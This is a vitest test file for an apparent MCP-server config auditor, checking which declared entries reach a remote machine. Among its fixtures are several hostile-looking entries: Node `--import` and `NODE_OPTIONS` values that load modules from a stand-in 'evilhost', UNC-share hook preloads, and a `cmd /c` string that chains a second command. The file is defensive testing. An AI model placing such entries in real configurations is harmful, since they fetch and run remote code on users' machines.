/**
 * `mcpaudit/launch.ts#remoteReasonOf` — which declared entries reach
 * another machine, and so need allow_remote (fix round 4, I2 residual: the
 * gate matched a UNC path only at the start of an argument or after `=`,
 * and a URL only for http(s)/ws(s)).
 */

import { describe, expect, it } from 'vitest';
import type { McpServerEntry } from '../../../src/agentaudit/mcpServers.js';
import { remoteReasonOf } from '../../../src/mcpaudit/launch.js';

function entry(command: string, args: string[] = [], env?: Record<string, string>): McpServerEntry {
  return { sourceLabel: '.mcp.json', name: 's', command, args, ...(env === undefined ? {} : { env }), raw: {} };
}

describe('remoteReasonOf: remote', () => {
  it.each([
    ['a UNC path inside a cmd /c string', entry('cmd', ['/c', 'echo started> marker.txt & type \\\\192.0.2.1\\share\\x.txt'])],
    ['file://host in --import=', entry('node', ['--import=file://evilhost/share/x.mjs', 'server.js'])],
    ['a UNC path glued to a short flag', entry('node', ['-r\\\\host\\share\\hook.js', 'server.js'])],
    ['a UNC path after /config:', entry('tool.exe', ['/config:\\\\host\\share\\c.json'])],
    ['a UNC response file', entry('tool.exe', ['@\\\\host\\share\\args.txt'])],
    ['a device-namespace path', entry('tool.exe', ['--pipe=\\\\.\\pipe\\x'])],
    ['a forward-slash UNC path', entry('node', ['//host/share/server.js'])],
    ['ssh', entry('ssh', ['user@host', 'mcp-server'])],
    ['ssh.exe by full path', entry('C:\\Windows\\System32\\OpenSSH\\ssh.exe', ['host', 'mcp-server'])],
    ['docker -H ssh://', entry('docker', ['-H', 'ssh://user@host', 'run', '-i', 'img'])],
    ['docker -H tcp://', entry('docker', ['-H', 'tcp://192.0.2.1:2375', 'run', '-i', 'img'])],
    ['docker --host=', entry('docker', ['--host=unix:///var/run/other.sock', 'run', '-i', 'img'])],
    ['docker --context', entry('docker', ['--context', 'prod', 'run', '-i', 'img'])],
    ['podman --remote', entry('podman', ['--remote', 'run', '-i', 'img'])],
    ['DOCKER_HOST in env', entry('docker', ['run', '-i', 'img'], { DOCKER_HOST: 'tcp://192.0.2.1:2375' })],
    ['DOCKER_CONTEXT in env', entry('docker', ['run', '-i', 'img'], { DOCKER_CONTEXT: 'prod' })],
    ['NODE_OPTIONS importing from a host', entry('node', ['server.js'], { NODE_OPTIONS: '--import=file://evilhost/x.mjs' })],
    ['a UNC path in an env value', entry('node', ['server.js'], { CONFIG: '\\\\host\\share\\c.json' })],
    ['any scheme with a host in an env value', entry('node', ['server.js'], { DATABASE_URL: 'postgres://db.example/app' })],
    ['an https URL argument (mcp-remote)', entry('npx', ['-y', 'mcp-remote', 'https://192.0.2.1/mcp'])],
  ])('%s', (_what, e) => {
    expect(remoteReasonOf(e)).not.toBeNull();
  });
});

describe('remoteReasonOf: local', () => {
  it.each([
    ['node and a script', entry('node', ['server.js'])],
    ['npx and a package', entry('npx', ['-y', '@modelcontextprotocol/server-memory'])],
    ['a file:/// URL (no host)', entry('node', ['--import=file:///C:/work/hook.mjs', 'server.js'])],
    ['a Windows path', entry('C:\\tools\\server.exe', ['--root=C:\\work'])],
    ['docker run with no host', entry('docker', ['run', '--rm', '-i', 'img'])],
    ['DOCKER_HOST on a local socket', entry('docker', ['run', '-i', 'img'], { DOCKER_HOST: 'unix:///var/run/docker.sock' })],
    ['an ordinary env', entry('node', ['server.js'], { LOG_LEVEL: 'debug', ROOT: '/home/u/work' })],
  ])('%s', (_what, e) => {
    expect(remoteReasonOf(e)).toBeNull();
  });
});
